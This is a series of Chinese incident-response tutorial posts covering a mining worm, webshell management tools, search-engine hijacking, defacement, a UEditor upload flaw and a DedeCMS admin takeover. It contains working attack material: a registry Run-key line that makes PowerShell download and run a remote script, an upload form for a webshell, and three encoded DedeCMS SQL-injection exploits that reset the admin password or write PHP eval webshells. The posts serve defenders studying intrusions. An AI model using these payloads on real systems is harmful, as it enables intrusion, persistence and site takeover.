HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v <span class="string">&quot;Keyname&quot;</span> /t REG_SZ /d <span class="string">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.142:8080/a&#x27;))\&quot;&quot;</span> /f</span> </span><br></pre></td></tr></table></figure><p><img src="./image/privilege-3-15.png" alt=""></p><p>账号注销后，重新登录，界面上会出现powershell快速闪过消失，成功返回shell。</p><p><img src="./image/privilege-3-16.png" alt=""></p><p>注册表还有哪些键值可以设置为自启动：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run </span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run </span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br></pre></td></tr></table></figure><hr><h3 id="0x04-结束语">0x04 结束语</h3><p>本文简单介绍了通过三大渗透框架进行权限维持的几种方法，了解攻击者常用的渗透框架及后门技术，有助于更好地去发现并解决服务器安全问题。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第04章：Windows实战篇第6篇：挖矿病毒（二）</title>
      <link href="/posts/7ad785bc.html"/>
      <url>/posts/7ad785bc.html</url>
      
        <content type="html"><![CDATA[<h2 id="第6篇：挖矿病毒（二）">第6篇：挖矿病毒（二）</h2><h3 id="0x00-前言">0x00 前言</h3><p>作为一个运维工程师，而非一个专业的病毒分析工程师，遇到了比较复杂的病毒怎么办？别怕，虽然对二进制不熟，但是依靠系统运维的经验，我们可以用自己的方式来解决它。</p><h3 id="0x01-感染现象">0x01 感染现象</h3><p>1、向大量远程IP的445端口发送请求</p><p><img src="image/win-10-1.png" alt=""></p><p>2、使用各种杀毒软件查杀无果，虽然能识别出在C:\Windows\NerworkDistribution中发现异常文件，但即使删除NerworkDistribution后，每次重启又会再次生成。</p><p><img src="image/win-10-2.jpg" alt=""></p><p>连杀软清除不了的病毒，只能手工来吧，个人比较偏好火绒，界面比较简洁，功能也挺好用的，自带的火绒剑是安全分析利器。于是安装了火绒，有了如下分析排查过程。</p><h3 id="0x02-事件分析">0x02 事件分析</h3><h4 id="A、网络链接">A、网络链接</h4><p>通过现象，找到对外发送请求的进程ID：4960</p><p><img src="image/win-10-3.png" alt=""></p><h4 id="B、进程分析">B、进程分析</h4><p>进一步通过进程ID找到相关联的进程，父进程为1464</p><p><img src="image/win-10-4.png" alt=""></p><p>找到进程ID为1464的服务项，逐一排查，我们发现服务项RemoteUPnPService存在异常。</p><p><img src="image/win-10-5.png" alt=""></p><h4 id="C、删除服务">C、删除服务</h4><p>选择可疑服务项，右键属性，停止服务，启动类型：禁止。</p><p><img src="image/win-10-6.png" alt=""></p><p>停止并禁用服务，再清除NerworkDistribution目录后，重启计算机。异常请求和目录的现象消失。</p><p>又排查了几台，现象一致，就是服务项的名称有点变化。</p><p><img src="image/win-10-7.png" alt=""></p><h4 id="D、病毒清除">D、病毒清除</h4><p>挖矿病毒清除过程如下：</p><p>1、 停止并禁用可疑的服务项，服务项的名称会变，但描述是不变的，根据描述可快速找到可疑服务项。</p><p>​可疑服务项描述：Enables a common interface and object model for the Remote UPnP Service to access</p><p>​删除服务项：Sc delete RemoteUPnPService</p><p>2、  删除C:\Windows\NerworkDistribution目录</p><p>3、  重启计算机</p><p>4、  使用杀毒软件全盘查杀</p><p>5、  到微软官方网站下载对应操作系统补丁，下载链接：</p><p><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010</a></p><h3 id="0x03-后记">0x03 后记</h3><p>在查询了大量资料后，找到了一篇在2018年2月有关该病毒的报告：</p><p>NrsMiner：一个构造精密的挖矿僵尸网络</p><p><a href="https://www.freebuf.com/articles/system/162874.html">https://www.freebuf.com/articles/system/162874.html</a></p><p>根据文章提示，这个病毒的构造非常的复杂，主控模块作为服务“Hyper-VAccess Protection Agent Service”的ServiceDll存在。但与目前处理的情况有所不同，该病毒疑似是升级了。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第03章：权限维持篇第7篇：常见WebShell管理工具</title>
      <link href="/posts/c142b98c.html"/>
      <url>/posts/c142b98c.html</url>
      
        <content type="html"><![CDATA[<p>攻击者在入侵网站时，通常要通过各种方式写入Webshell，从而获得服务器的控制权限，比如执行系统命令、读取配置文件、窃取用户数据，篡改网站页面等操作。</p><p>本文介绍十款常用的Webshell管理工具，以供你选择，你会选择哪一个？</p><hr><p><strong>1、中国菜刀(Chopper)</strong></p><p>中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UNICODE方式编译，支持多国语言输入显示。</p><p><img src="./image/privilege-6-1.png" alt=""></p><p><strong>2、蚁剑(AntSword)</strong></p><p>AntSword是一个开放源代码，跨平台的网站管理工具，旨在满足渗透测试人员以及具有权限和/或授权的安全研究人员以及网站管理员的需求。</p><p>github项目地址：<a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p><p><img src="./image/privilege-6-2.png" alt=""></p><p><strong>3、C刀(Cknife)</strong></p><p>这是一款跨平台的基于配置文件的中国菜刀，把所有操作给予用户来定义。</p><p>github项目地址：<a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p><p><img src="./image/privilege-6-3.png" alt=""></p><p><strong>4、冰蝎(Behinder)</strong></p><p>冰蝎”是一款动态二进制加密网站管理客户端。</p><p>github地址：<a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p><p><img src="./image/privilege-6-4.png" alt=""></p><p><strong>5、Xise</strong></p><p>XISE WebShell管理工具。</p><p><img src="./image/privilege-6-5.png" alt=""></p><p><strong>6、Altman</strong></p><p>Altman3是一款渗透测试软件，基于.Net4.0开发，依托Eto.Form可以完美运行在Windows、Linux、Mac等多个平台。</p><p>github项目地址：<a href="https://github.com/keepwn/Altman">https://github.com/keepwn/Altman</a></p><p><img src="./image/privilege-6-6.png" alt=""></p><p><strong>7、Weevely</strong></p><p>Weevely是一种Python编写的webshell管理工具，跨平台，只支持PHP。</p><p>github项目地址：<a href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></p><p>用法示例：</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely <span class="keyword">generate</span> &lt;password&gt; &lt;path&gt;</span><br><span class="line">weevely &lt;URL&gt; &lt;password&gt; [cmd]</span><br></pre></td></tr></table></figure><p>同时，在Kali 2.0 版本下，集成了三款Web后门工具：WebaCoo、weevely、PHP Meterpreter。</p><p><img src="./image/privilege-6-7.png" alt=""></p><p><strong>8、QuasiBot</strong></p><p>QuasiBot是一款php编写的webshell管理工具，可以对webshell进行远程批量管理。</p><p>github项目地址：<a href="https://github.com/Smaash/quasibot">https://github.com/Smaash/quasibot</a></p><p><img src="./image/privilege-6-8.png" alt=""></p><p><strong>9、Webshell-Sniper</strong></p><p>这是一款基于终端的webshell管理工具，仅支持在类Unix系统上运行。</p><p>github项目地址：<a href="https://github.com/WangYihang/Webshell-Sniper">https://github.com/WangYihang/Webshell-Sniper</a></p><p>用法示例：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Usage : </span><br><span class="line">        python webshell-sniper.py [URL] [<span class="keyword">METHOD</span>] [<span class="title function_">AUTH</span>]</span><br><span class="line"><span class="title function_">Example</span> : </span><br><span class="line">        python webshell-sniper.py http:<span class="comment">//127.0.0.1/c.php POST c</span></span><br></pre></td></tr></table></figure><p><img src="./image/privilege-6-9.png" alt=""></p><p><strong>10、WebshellManager</strong></p><p>一款用PHP+Mysql写的一句话WEB端管理工具，目前仅支持对PHP的一句话进行操作。</p><p>github项目地址：<a href="https://github.com/boy-hack/WebshellManager">https://github.com/boy-hack/WebshellManager</a></p><p><img src="./image/privilege-6-10.png" alt=""></p><p>我在知识星球发起了一个小讨论，也收集到了一些webshell管理工具，如 hatchet、K8飞刀、lanker，欢迎补充。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第06章：Web实战篇第6篇：搜索引擎劫持</title>
      <link href="/posts/ecf75b11.html"/>
      <url>/posts/ecf75b11.html</url>
      
        <content type="html"><![CDATA[<h2 id="第6篇：搜索引擎劫持">第6篇：搜索引擎劫持</h2><p>​当你直接打开网址访问网站，是正常的，可是当你在搜索引擎结果页中打开网站时，会跳转到一些其他网站，比如博彩，虚假广告，淘宝搜索页面等。是的，你可能了遇到搜索引擎劫持。</p><h3 id="现象描述">现象描述</h3><p>从搜索引擎来的流量自动跳转到指定的网页</p><h3 id="问题处理">问题处理</h3><p>通过对index.php文件进行代码分析，发现该文件代码 对来自搜狗和好搜的访问进行流量劫持。</p><p><img src="./image/6-1.png" alt=""></p><p>进一步跟着include函数包含的文件，index,php包含/tmp/.ICE-unix/… /c.jpg。</p><p><img src="./image/6-2.png" alt=""></p><p>进入/tmp目录进行查看，发现该目录下，如c.jpg等文件，包含着一套博彩劫持的程序。</p><p><img src="./image/6-3.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第06章：Web实战篇第7篇：网站首页被篡改</title>
      <link href="/posts/5dde714.html"/>
      <url>/posts/5dde714.html</url>
      
        <content type="html"><![CDATA[<h2 id="第7篇：网站首页被篡改">第7篇：网站首页被篡改</h2><p>​网站首页被非法篡改，是的，就是你一打开网站就知道自己的网站出现了安全问题，网站程序存在严重的安全漏洞，攻击者通过上传脚本木马，从而对网站内容进行篡改。而这种篡改事件在某些场景下，会被无限放大。</p><h3 id="现象描述">现象描述</h3><p>网站首页被恶意篡改，比如复制原来的图片，PS一下，然后替换上去。</p><h3 id="问题处理">问题处理</h3><p>1、<strong>确认篡改时间</strong></p><p>通过对被篡改的图片进行查看，确认图片篡改时间为2018年04月18日 19:24:07 。</p><p><img src="./image/7-1.jpg" alt=""></p><p><strong>2、访问日志溯源</strong></p><p>通过图片修改的时间节点，发现可疑IP：113.xx.xx.24 （代理IP，无法追溯真实来源），访问image.jsp（脚本木马），并随后访问了被篡改的图片地址。</p><p><img src="./image/7-2.png" alt=""></p><p>进一步审查所有的日志文件(日志保存时间从2017-04-20至2018-04-19)，发现一共只有两次访问image.jsp文件的记录，分别是2018-04-18和2017-09-21。</p><p><img src="./image/7-3.png" alt=""></p><p>image.jsp在2017-09-21之前就已经上传到网站服务器，已经潜藏长达半年多甚至更久的时间。</p><p><strong>3、寻找真相</strong></p><p>我们在网站根目录找到了答案，发现站点目录下存在ROOT.rar全站源码备份文件，备份时间为2017-02-28<br>10:35。</p><p><img src="./image/7-4.png" alt=""></p><p>通过对ROOT.rar解压缩，发现源码中存在的脚本木马与网站访问日志的可疑文件名一致（image.jsp）。</p><p><img src="./image/7-5.png" alt=""></p><p>根据这几个时间节点，我们尝试去还原攻击者的攻击路径。</p><p>但是我们在访问日志并未找到ROOT.rar的访问下载记录，访问日志只保留了近一年的记录，而这个webshell可能已经存在了多年。</p><p>黑客是如何获取webshell的呢？</p><p>可能是通过下载ROOT.rar全站源码备份文件获取到其中存在的木马信息，或者几年前入侵并潜藏了多年，又或者是从地下黑产购买了shell，我们不得而知。</p><p>本文的示例中攻击者为我们留下了大量的证据和记录，而更多时候，攻击者可能会清除所有的关键信息，这势必会加大调查人员的取证难度。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第06章：Web实战篇第9篇：编辑器入侵事件</title>
      <link href="/posts/8f30931b.html"/>
      <url>/posts/8f30931b.html</url>
      
        <content type="html"><![CDATA[<h2 id="第9篇：编辑器入侵事件">第9篇：编辑器入侵事件</h2><p>UEditor是百度的一个javascript编辑器的开源项目，很多开发人员都喜欢引用这个编辑器，但这个编辑器官网版本一直停留在2016-05-26，已经很久没有更新了。</p><h3 id="0x01-现象描述">0x01 现象描述</h3><p>HIDS预警：发现后门(Webshell)文件，建议您立即进行处理。</p><h3 id="0x02-事件分析">0x02 事件分析</h3><p><strong>1、发现Webshell</strong></p><p>通过预警信息，找到木马文件路径：</p><p><img src="./image/9-1.png" alt=""></p><p>备注：紧急处理，通过禁止动态脚本在上传目录的运行权限，使webshell无法成功执行。</p><p><strong>2、定位文件上传时间</strong></p><p>根据Webshell文件创建时间，2020年3月9日 15:08:34</p><p><img src="./image/9-2.png" alt=""></p><p>3、<strong>Web访问日志关联分析</strong></p><p>由于，IIS日志时间与系统时间相差8小时，系统时间是15:08，我们这里查看的是 7:08的日志时间。</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2020</span><span class="number">-03</span><span class="number">-09</span> <span class="number">07</span>:<span class="number">08</span>:<span class="number">34</span> <span class="number">10.215</span><span class="number">.2</span><span class="number">.128</span> POST /ueditor/net/controller.ashx action=catchimage</span><br><span class="line"><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span>.</span><br><span class="line"><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span>.</span><br><span class="line"><span class="number">2020</span><span class="number">-03</span><span class="number">-09</span> <span class="number">07</span>:<span class="number">08</span>:<span class="number">35</span> <span class="number">10.215</span><span class="number">.2</span><span class="number">.128</span> POST /ueditor/net/controller.ashx action=catchimage</span><br></pre></td></tr></table></figure><p>找到对应的网站访问日志，在文件创建时间隔间里，我们会注意到这样两个ueditor的访问请求，初步怀疑是UEditor编辑器任意文件上传漏洞。</p><p><strong>4、本地漏洞复现</strong></p><p>A、本地构建一个html</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">form</span> action=<span class="string">&quot;http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage&quot;</span>enctype=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>  method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">  &lt;p&gt;<span class="keyword">shell</span> addr:&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;source[]&quot;</span> /&gt;&lt;/p &gt;</span><br><span class="line">  &lt;inputtype=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span> /&gt;</span><br><span class="line">&lt;/<span class="keyword">form</span>&gt;</span><br></pre></td></tr></table></figure><p>B、上传webshell，上传成功</p><p><img src="./image/9-3.png" alt=""></p><p>经漏洞复现，确认UEditor编辑器任意文件上传漏洞。</p><p><strong>5、还原攻击者行为</strong></p><p>通过相关文件的访问记录进行关联分析，攻击者通过 ueditor编辑器成功上传webshell。</p><h3 id="0x03-事件处理">0x03 事件处理</h3><p>1、<strong>删除Webshell</strong></p><p>清楚已发现的webshell，并尝试查找可能隐藏的webshell。</p><p><strong>2、代码完整性验证</strong></p><p>我们来思考一个问题，如果有一个免杀的Webshell隐藏在数以万行的代码中，怎么搞？</p><p>文件完整性校验，检查网站的源码是否被篡改过。</p><p>操作过程：</p><p>通过查看服务器上已部署的源代码版本，找研发同事要同样版本的代码。把纯净源码的所有文件计算一次hash值保存，再到服务器上执行一次hash值，通过比对hash值，输出新创建的/被修改过的/删除的文件列表。</p><p><strong>3、系统入侵排查</strong></p><p>对系统做一个整体排查，确认是否存在后门</p><p><strong>4、代码修复</strong></p><p>反馈给相关开发人员进行代码修复。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第06章：Web实战篇第8篇：管理员账号被篡改</title>
      <link href="/posts/67eb9ec7.html"/>
      <url>/posts/67eb9ec7.html</url>
      
        <content type="html"><![CDATA[<h2 id="第8篇：管理员账号被篡改">第8篇：管理员账号被篡改</h2><p>​你是某一个网站的管理员，有一天，你的管理员账号admin却登录不了，进入数据库查看，原来管理员账号用户名不存在了，却多了另外一个管理员用户名。不对，不是新增了管理员，而是你的管理员用户名被篡改了。</p><h3 id="现象描述">现象描述</h3><p>前后端分离，后台只允许内网访问，管理员账号admin却依然被多次被篡改</p><h3 id="问题处理">问题处理</h3><p><strong>1、网站webshell</strong></p><p>在针对网站根目录进行webshell扫描，发现存在脚本木马，创建时间为2018-06-13 04:30:30</p><p><img src="./image/8-1.png" alt=""></p><p><strong>2、 定位IP</strong></p><p>通过木马创建时间， 查看网站访问日志，定位到IP为：180.xx.xx.3</p><p><img src="./image/8-2.png" alt=""></p><p><strong>3、关联分析</strong></p><p>全局搜索与该IP有关的操作日志：</p><p><img src="./image/8-3.png" alt=""></p><p>在脚本木马生成前，有两条比较可疑的访问日志吸引了我们的注意：</p><p><code>172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] &quot;GET /plus/download.php?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=109&amp;arrs2[]=121&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=110&amp;arrs2[]=111&amp;arrs2[]=114&amp;arrs2[]=109&amp;arrs2[]=98&amp;arrs2[]=111&amp;arrs2[]=100&amp;arrs2[]=121&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=61&amp;arrs2[]=32&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=102&amp;arrs2[]=105&amp;arrs2[]=108&amp;arrs2[]=101&amp;arrs2[]=95&amp;arrs2[]=112&amp;arrs2[]=117&amp;arrs2[]=116&amp;arrs2[]=95&amp;arrs2[]=99&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=101&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=115&amp;arrs2[]=40&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=46&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=101&amp;arrs2[]=118&amp;arrs2[]=97&amp;arrs2[]=108&amp;arrs2[]=40&amp;arrs2[]=36&amp;arrs2[]=95&amp;arrs2[]=80&amp;arrs2[]=79&amp;arrs2[]=83&amp;arrs2[]=84&amp;arrs2[]=91&amp;arrs2[]=120&amp;arrs2[]=93&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=101&amp;arrs2[]=99&amp;arrs2[]=104&amp;arrs2[]=111&amp;arrs2[]=32&amp;arrs2[]=109&amp;arrs2[]=79&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=87&amp;arrs2[]=72&amp;arrs2[]=69&amp;arrs2[]=82&amp;arrs2[]=69&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=97&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=57&amp;arrs2[]=32&amp;arrs2[]=35 HTTP/1.1&quot; 200 67</code></p><p><code>172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] &quot;GET /plus/ad_js.php?aid=19 HTTP/1.1&quot; 200 32</code></p><p>对这段POC进行解码，我们发现通过这个poc可以往数据库中插入数据，进一步访问/plus/ad_js.php?aid=19 即可在plus目录生成read.php脚本文件。</p><p><img src="./image/8-4.png" alt=""></p><p>解码后：</p><p>cfg_dbprefixmyad<code>SET</code>normbody<code>= '&lt;?php file_put_contents(''read.php'',''&lt;?php eval($_POST[x]);echo mOon;?&gt;'');?&gt;' WHERE</code>aid` =19 #</p><p>综上，可以推测/plus/download.php中可能存在SQL注入漏洞，接下来，收集网上已公开的有以下3种EXP进行漏洞复现。</p><h4 id="漏洞复现">漏洞复现</h4><p><strong>利用方式一：修改后台管理员</strong></p><p>1、新建管理员账号test/test123789，可以成功登录网站后台</p><p>2、构造如下注入SQL语句：</p><p><code>cfg_dbprefixadmin SETuserid='spider',pwd</code>=‘f297a57a5a743894a0e4’ where id=19 #`</p><p>修改后台管理员为：用户名spider，密码admin。</p><p>（3）对应的EXP:</p><p><code>？open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=109&amp;arrs2[]=105&amp;arrs2[]=110&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=117&amp;arrs2[]=115&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=115&amp;arrs2[]=112&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=112&amp;arrs2[]=119&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=102&amp;arrs2[]=50&amp;arrs2[]=57&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=97&amp;arrs2[]=55&amp;arrs2[]=52&amp;arrs2[]=51&amp;arrs2[]=56&amp;arrs2[]=57&amp;arrs2[]=52&amp;arrs2[]=97&amp;arrs2[]=48&amp;arrs2[]=101&amp;arrs2[]=52&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=119&amp;arrs2[]=104&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=32&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=57&amp;arrs2[]=32&amp;arrs2[]=35</code></p><p>执行EXP后，相应后台数据库表变为如下：</p><p><img src="./image/8-5.png" alt=""></p><p>（4）因此相应后台登录用户变为spider密码admin</p><p><strong>利用方式二：通过/plus/mytag_js.php文件生成一句话木马php</strong></p><p>（1）如：构造如下注入SQL语句：</p><p>`cfg_dbprefixmytag(aid,expbody,normbody) VALUES(9013,@‘,’{dede:php}file_put_contents(‘‘90sec.php’’,‘’<?php eval($_POST[guige]);?>‘’);{/dede:php}‘) # @’``</p><p>（2）对应的EXP:</p><p><code>?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=109&amp;arrs2[]=121&amp;arrs2[]=116&amp;arrs2[]=97&amp;arrs2[]=103&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=40&amp;arrs2[]=97&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=44&amp;arrs2[]=101&amp;arrs2[]=120&amp;arrs2[]=112&amp;arrs2[]=98&amp;arrs2[]=111&amp;arrs2[]=100&amp;arrs2[]=121&amp;arrs2[]=44&amp;arrs2[]=110&amp;arrs2[]=111&amp;arrs2[]=114&amp;arrs2[]=109&amp;arrs2[]=98&amp;arrs2[]=111&amp;arrs2[]=100&amp;arrs2[]=121&amp;arrs2[]=41&amp;arrs2[]=32&amp;arrs2[]=86&amp;arrs2[]=65&amp;arrs2[]=76&amp;arrs2[]=85&amp;arrs2[]=69&amp;arrs2[]=83&amp;arrs2[]=40&amp;arrs2[]=57&amp;arrs2[]=48&amp;arrs2[]=49&amp;arrs2[]=51&amp;arrs2[]=44&amp;arrs2[]=64&amp;arrs2[]=96&amp;arrs2[]=92&amp;arrs2[]=39&amp;arrs2[]=96&amp;arrs2[]=44&amp;arrs2[]=39&amp;arrs2[]=123&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=58&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=125&amp;arrs2[]=102&amp;arrs2[]=105&amp;arrs2[]=108&amp;arrs2[]=101&amp;arrs2[]=95&amp;arrs2[]=112&amp;arrs2[]=117&amp;arrs2[]=116&amp;arrs2[]=95&amp;arrs2[]=99&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=101&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=115&amp;arrs2[]=40&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=57&amp;arrs2[]=48&amp;arrs2[]=115&amp;arrs2[]=101&amp;arrs2[]=99&amp;arrs2[]=46&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=101&amp;arrs2[]=118&amp;arrs2[]=97&amp;arrs2[]=108&amp;arrs2[]=40&amp;arrs2[]=36&amp;arrs2[]=95&amp;arrs2[]=80&amp;arrs2[]=79&amp;arrs2[]=83&amp;arrs2[]=84&amp;arrs2[]=91&amp;arrs2[]=103&amp;arrs2[]=117&amp;arrs2[]=105&amp;arrs2[]=103&amp;arrs2[]=101&amp;arrs2[]=93&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=123&amp;arrs2[]=47&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=58&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=125&amp;arrs2[]=39&amp;arrs2[]=41&amp;arrs2[]=32&amp;arrs2[]=35&amp;arrs2[]=32&amp;arrs2[]=64&amp;arrs2[]=96&amp;arrs2[]=92&amp;arrs2[]=39&amp;arrs2[]=96</code></p><p>（3）执行EXP后，将向数据库表dede_mytag中插入一条记录，</p><p><img src="./image/8-6.png" alt=""></p><p>（4）执行如下语句，在/plus目录下生成90sec.php一句话木马 <a href="http://www.xxxx.com/plus/mytag_js.php?aid=9013">http://www.xxxx.com/plus/mytag_js.php?aid=9013</a></p><p><strong>利用方式三：使/plus/ad_js.php文件变为一句话木马php</strong></p><p>（1）如：构造如下注入SQL语句：</p><p><code>cfg_dbprefixmyadSETnormbody= '&lt;?php file_put_contents(''read.php'',''&lt;?php eval($_POST[x]);echo mOon;?&gt;'');?&gt;' WHEREaid</code> =19 